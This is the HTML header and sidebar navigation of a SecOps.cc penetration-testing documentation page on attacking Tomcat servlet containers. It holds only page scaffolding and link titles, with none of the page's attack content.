<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SecOps.cc is an information security platform designed to cover various offensive & defensive security topics"><meta name=author content=dh><link href=https://secops.cc/attacking_common_apps/containers_software_dev/ rel=canonical><link rel=icon href=../../assets/favicon.png><meta name=generator content="mkdocs-1.3.1, mkdocs-material-8.1.4"><title>Servlet Containers/Software Development - SecOps.cc</title><link rel=stylesheet href=../../assets/stylesheets/main.bb3983ee.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#tomcat-discovery-enumeration class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=SecOps.cc class="md-header__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> SecOps.cc </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Servlet Containers/Software Development </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../docs/ class="md-tabs__link md-tabs__link--active"> Docs </a> </li> <li class=md-tabs__item> <a href=../../blog/ class=md-tabs__link> Blog </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=SecOps.cc class="md-nav__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> SecOps.cc </label> <div class=md-nav__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> Home </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <div class="md-nav__link md-nav__link--index "> <a href=../../docs/ >Docs</a> <label for=__nav_2> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Docs data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Docs </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Cheatsheets <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Cheatsheets data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2_1 type=checkbox id=__nav_2_2_1> <label class=md-nav__link for=__nav_2_2_1> Pentesting/CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pentesting/CTF data-md-level=3> <label class=md-nav__title for=__nav_2_2_1> <span class="md-nav__icon md-icon"></span> Pentesting/CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cheat_sheets/cheatsheet-77/ class=md-nav__link> Commands </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/linux_shortcuts/ class=md-nav__link> Linux Shortcuts </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/windows/ class=md-nav__link> Windows </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/shells_payloads/ class=md-nav__link> Shells & Payloads </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_requests/ class=md-nav__link> Web requests </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/deobfuscation/ class=md-nav__link> (De)Obfuscation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/brute_forcing/ class=md-nav__link> Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/common_apps/ class=md-nav__link> Common Applications </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_attacks/ class=md-nav__link> Web Attacks </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/file_transfer/ class=md-nav__link> File Transfer </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/win_privesc/ class=md-nav__link> Windows Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/footprinting/ class=md-nav__link> Footprinting </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3 type=checkbox id=__nav_2_3 checked> <label class=md-nav__link for=__nav_2_3> Red Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Team" data-md-level=2> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1 type=checkbox id=__nav_2_3_1> <label class=md-nav__link for=__nav_2_3_1> Footprinting <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Footprinting data-md-level=3> <label class=md-nav__title for=__nav_2_3_1> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/domain_information/ class=md-nav__link> Domain Information </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_2 type=checkbox id=__nav_2_3_1_2> <label class=md-nav__link for=__nav_2_3_1_2> Host Based Enumeration <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Host Based Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_2> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/smb/ class=md-nav__link> SMB </a> </li> <li class=md-nav__item> <a href=../../footprinting/nfs/ class=md-nav__link> NFS </a> </li> <li class=md-nav__item> <a href=../../footprinting/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../footprinting/smtp/ class=md-nav__link> SMTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/imap_pop3/ class=md-nav__link> IMAP/POP3 </a> </li> <li class=md-nav__item> <a href=../../footprinting/snmp/ class=md-nav__link> SNMP </a> </li> <li class=md-nav__item> <a href=../../footprinting/mysql/ class=md-nav__link> MySQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/mssql/ class=md-nav__link> MSSQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/ipmi/ class=md-nav__link> IPMI </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_3 type=checkbox id=__nav_2_3_1_3> <label class=md-nav__link for=__nav_2_3_1_3> Remote Management Protocols <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Management Protocols" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_3> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/linux_remote_management_protocol/ class=md-nav__link> Linux </a> </li> <li class=md-nav__item> <a href=../../footprinting/windows_remote_management_protocol/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2 type=checkbox id=__nav_2_3_2> <label class=md-nav__link for=__nav_2_3_2> OS Basics <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="OS Basics" data-md-level=3> <label class=md-nav__title for=__nav_2_3_2> <span class="md-nav__icon md-icon"></span> OS Basics </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_1 type=checkbox id=__nav_2_3_2_1> <label class=md-nav__link for=__nav_2_3_2_1> Basics Linux <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Linux" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_1> <span class="md-nav__icon md-icon"></span> Basics Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_linux/linux/ class=md-nav__link> Linux </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_2 type=checkbox id=__nav_2_3_2_2> <label class=md-nav__link for=__nav_2_3_2_2> Basics Windows <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Windows" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_2> <span class="md-nav__icon md-icon"></span> Basics Windows </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_windows/windows/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3 type=checkbox id=__nav_2_3_3> <label class=md-nav__link for=__nav_2_3_3> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=3> <label class=md-nav__title for=__nav_2_3_3> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1 type=checkbox id=__nav_2_3_3_1> <label class=md-nav__link for=__nav_2_3_3_1> Windows PrivEsc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows PrivEsc" data-md-level=4> <label class=md-nav__title for=__nav_2_3_3_1> <span class="md-nav__icon md-icon"></span> Windows PrivEsc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/tools/ class=md-nav__link> Useful Tools </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_2 type=checkbox id=__nav_2_3_3_1_2> <label class=md-nav__link for=__nav_2_3_3_1_2> Getting the Lay of the Land <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Getting the Lay of the Land" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_2> <span class="md-nav__icon md-icon"></span> Getting the Lay of the Land </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/gtlotl/ class=md-nav__link> Situational Awareness </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/init_enum/ class=md-nav__link> Initial Enumeration </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/comm_with_ps/ class=md-nav__link> Communication with Processes </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_3 type=checkbox id=__nav_2_3_3_1_3> <label class=md-nav__link for=__nav_2_3_3_1_3> Windows User Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows User Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_3> <span class="md-nav__icon md-icon"></span> Windows User Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/seimpersonate_seassignprimarytoken/ class=md-nav__link> SeImpersonate and SeAssignPrimaryToken </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/sebugpriv/ class=md-nav__link> SeDebugPrivilege </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/setakeownershippriv/ class=md-nav__link> SeTakeOwnershipPrivilege </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_4 type=checkbox id=__nav_2_3_3_1_4> <label class=md-nav__link for=__nav_2_3_3_1_4> Windows Group Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Group Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_4> <span class="md-nav__icon md-icon"></span> Windows Group Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/builtin_groups/ class=md-nav__link> Windows Built-in Groups </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/eventlog_readers/ class=md-nav__link> Event Log Readers </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/dnsadmins/ class=md-nav__link> DnsAdmins </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/hyperv_admins/ class=md-nav__link> Hyper-V Administrators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/print_operators/ class=md-nav__link> Print Operators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/server_operators/ class=md-nav__link> Server Operators </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_5 type=checkbox id=__nav_2_3_3_1_5> <label class=md-nav__link for=__nav_2_3_3_1_5> Attacking the OS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking the OS" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_5> <span class="md-nav__icon md-icon"></span> Attacking the OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/user_account_control/ class=md-nav__link> User Account Control </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/weak_permissions/ class=md-nav__link> Weak Permissions </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/kernel_exploits/ class=md-nav__link> Kernel Exploits </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/vulnerable_services/ class=md-nav__link> Vulnerable Services </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_6 type=checkbox id=__nav_2_3_3_1_6> <label class=md-nav__link for=__nav_2_3_3_1_6> Credential Theft <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Credential Theft" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_6> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/credential_hunting/ class=md-nav__link> Credential Hunting </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/other_files/ class=md-nav__link> Other Files </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/further_credential_theft/ class=md-nav__link> Further Credential Theft </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_7 type=checkbox id=__nav_2_3_3_1_7> <label class=md-nav__link for=__nav_2_3_3_1_7> Additional Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Additional Techniques" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_7> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/interacting_with_users/ class=md-nav__link> Interacting with Users </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/miscellaneous_techniques/ class=md-nav__link> Miscellaneous Techniques </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_8 type=checkbox id=__nav_2_3_3_1_8> <label class=md-nav__link for=__nav_2_3_3_1_8> EOL Systems <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="EOL Systems" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_8> <span class="md-nav__icon md-icon"></span> EOL Systems </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/windows_server/ class=md-nav__link> Windows Server </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/windows_desktop/ class=md-nav__link> Windows Desktop </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_4 type=checkbox id=__nav_2_3_4> <label class=md-nav__link for=__nav_2_3_4> File Transfers <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Transfers" data-md-level=3> <label class=md-nav__title for=__nav_2_3_4> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_transfers/methods/ class=md-nav__link> Methods </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_5 type=checkbox id=__nav_2_3_5> <label class=md-nav__link for=__nav_2_3_5> Networking <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Networking data-md-level=3> <label class=md-nav__title for=__nav_2_3_5> <span class="md-nav__icon md-icon"></span> Networking </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../networking/overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_6 type=checkbox id=__nav_2_3_6> <label class=md-nav__link for=__nav_2_3_6> Login Brute Forcing <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Login Brute Forcing" data-md-level=3> <label class=md-nav__title for=__nav_2_3_6> <span class="md-nav__icon md-icon"></span> Login Brute Forcing </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../login_brute_forcing/basic_http_auth_brute_forcing/ class=md-nav__link> Basic HTTP Auth Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/web_forms_brute_forcing/ class=md-nav__link> Web Forms Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/service_authentication/ class=md-nav__link> Service Authentication Attacks </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_7 type=checkbox id=__nav_2_3_7 checked> <label class=md-nav__link for=__nav_2_3_7> Atk Common Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Common Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_7> <span class="md-nav__icon md-icon"></span> Atk Common Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../setting_the_stage/ class=md-nav__link> Setting the Stage </a> </li> <li class=md-nav__item> <a href=../content_management_systems/ class=md-nav__link> Content Management Systems </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Servlet Containers/Software Development <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Servlet Containers/Software Development </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#discoveryfootprint class=md-nav__link> Discovery/Footprint </a> </li> <li class=md-nav__item> <a href=#enumeration class=md-nav__link> Enumeration </a> </li> <li class=md-nav__item> <a href=#attacking-tomcat class=md-nav__link> Attacking Tomcat </a> </li> <li class=md-nav__item> <a href=#tomcat-manager-login-brute-force class=md-nav__link> Tomcat Manager - Login Brute Force </a> </li> <li class=md-nav__item> <a href=#tomcat-manager-war-file-upload class=md-nav__link> Tomcat Manager - WAR File Upload </a> </li> <li class=md-nav__item> <a href=#cve-2020-1938-ghostcat class=md-nav__link> CVE-2020-1938 : Ghostcat </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../infra_network_monitoring_tools/ class=md-nav__link> Infrastructure/Network Monitoring Tools </a> </li> <li class=md-nav__item> <a href=../cs_config_mgmt/ class=md-nav__link> Customer Service Mgmt & Configuration Mgmt </a> </li> <li class=md-nav__item> <a href=../closing_out/ class=md-nav__link> Closing Out </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_8 type=checkbox id=__nav_2_3_8> <label class=md-nav__link for=__nav_2_3_8> Atk Web Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Web Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_8> <span class="md-nav__icon md-icon"></span> Atk Web Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_web_applications/http_verb_tampering/ class=md-nav__link> HTTP Verb Tampering </a> </li> 